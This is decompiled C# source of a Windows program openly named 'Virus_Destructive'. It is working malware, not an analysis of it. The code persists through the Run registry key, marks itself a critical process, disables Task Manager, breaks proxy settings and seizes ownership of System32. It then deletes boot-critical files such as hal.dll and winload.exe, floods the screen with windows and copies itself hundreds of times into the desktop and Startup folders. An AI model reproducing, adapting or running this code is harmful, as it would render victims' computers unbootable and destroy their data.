using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Virus_Destructive;

public class Virus_payload : Form
{
	private Random r;

	private IContainer components = null;

	private Timer tmr1;

	private Timer tmr_add;

	private Timer tmr_next_payload;

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public Virus_payload()
	{
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
		((Form)this).set_TopMost(true);
		r = new Random();
	}

	private void Virus_payload_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Virus_payload_Load(object sender, EventArgs e)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("WindowsStartupHelper", Application.get_ExecutablePath().ToString());
		RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", writable: true);
		registryKey2.SetValue("ProxyServer", 1);
		registryKey2.SetValue("ProxyEnable", 1);
		int processInformation = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref processInformation, 4);
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey3.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo("cmd.exe", "/k color 47 && takeown /f C:\\Windows\\System32 && icacls C:\\Windows\\System32 /grant %username%:F && takeown /f C:\\Windows\\System32\\drivers && icacls C:\\Windows\\System32\\drivers /grant %username%:F && Exit");
		process.Start();
		tmr1.Start();
		tmr_add.Start();
		tmr_next_payload.Start();
	}

	public static void CreateFile()
	{
		for (int i = 0; i < 200; i++)
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + $"\\Azrael's Payload{i}.exe"))
			{
				File.Copy(Application.get_StartupPath() + "\\Source\\Azrael's Payload.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + $"\\Azrael's Payload{i}.exe");
			}
		}
	}

	public static void StartupFlood()
	{
		for (int i = 0; i < 200; i++)
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + $"\\Azrael's Payload{i}.exe"))
			{
				File.Copy(Application.get_StartupPath() + "\\Source\\Azrael's Payload.exe", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + $"\\Azrael's Payload{i}.exe");
			}
		}
	}

	private void tmr1_Tick(object sender, EventArgs e)
	{
		tmr1.Stop();
		string path = "C:\\Windows\\System32\\hal.dll";
		string path2 = "C:\\Windows\\System32\\ci.dll";
		string path3 = "C:\\Windows\\System32\\winload.exe";
		string path4 = "C:\\Windows\\System32\\drivers\\disk.sys";
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		if (File.Exists(path3))
		{
			File.Delete(path3);
		}
		if (File.Exists(path4))
		{
			File.Delete(path4);
		}
	}

	private void tmr_add_Tick(object sender, EventArgs e)
	{
		tmr_add.Stop();
		int num = r.Next(5);
		if (num == 1)
		{
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
		}
		if (num == 2)
		{
			Process.Start("notepad.exe");
			Process.Start("notepad.exe");
			Process.Start("notepad.exe");
			Process.Start("notepad.exe");
			Process.Start("notepad.exe");
			Process.Start("notepad.exe");
			Process.Start("notepad.exe");
			Process.Start("notepad.exe");
		}
		if (num == 3)
		{
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
			Process.Start("cmd.exe");
		}
		if (num == 4)
		{
			Process.Start("https://mynoise.net/NoiseMachines/whiteNoiseGenerator.php?l=00180250525557999999");
			Process.Start("https://mynoise.net/NoiseMachines/whiteNoiseGenerator.php?l=00180250525557999999");
			Process.Start("https://mynoise.net/NoiseMachines/whiteNoiseGenerator.php?l=00180250525557999999");
			Process.Start("https://mynoise.net/NoiseMachines/whiteNoiseGenerator.php?l=00180250525557999999");
			Process.Start("https://mynoise.net/NoiseMachines/whiteNoiseGenerator.php?l=00180250525557999999");
			Process.Start("https://mynoise.net/NoiseMachines/whiteNoiseGenerator.php?l=00180250525557999999");
			Process.Start("https://mynoise.net/NoiseMachines/whiteNoiseGenerator.php?l=00180250525557999999");
		}
		if (num == 5)
		{
			Process.Start("https://i.gifer.com/HSxe.gif");
			Process.Start("https://i.gifer.com/HSxe.gif");
			Process.Start("https://i.gifer.com/HSxe.gif");
			Process.Start("https://i.gifer.com/HSxe.gif");
			Process.Start("https://i.gifer.com/HSxe.gif");
		}
		tmr_add.Start();
	}

	private void tmr_next_payload_Tick(object sender, EventArgs e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		tmr_next_payload.Stop();
		Virus_sound virus_sound = new Virus_sound();
		((Form)virus_sound).ShowDialog();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Expected O, but got Unknown
		//IL_0185: Unknown result type (might be due to invalid IL or missing references)
		//IL_018f: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Virus_payload));
		tmr1 = new Timer(components);
		tmr_add = new Timer(components);
		tmr_next_payload = new Timer(components);
		((Control)this).SuspendLayout();
		tmr1.set_Enabled(true);
		tmr1.set_Interval(15000);
		tmr1.add_Tick((EventHandler)tmr1_Tick);
		tmr_add.set_Enabled(true);
		tmr_add.set_Interval(10000);
		tmr_add.add_Tick((EventHandler)tmr_add_Tick);
		tmr_next_payload.set_Enabled(true);
		tmr_next_payload.set_Interval(20000);
		tmr_next_payload.add_Tick((EventHandler)tmr_next_payload_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Virus_payload");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Virus_payload");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Virus_payload_FormClosing));
		((Form)this).add_Load((EventHandler)Virus_payload_Load);
		((Control)this).ResumeLayout(false);
	}
}
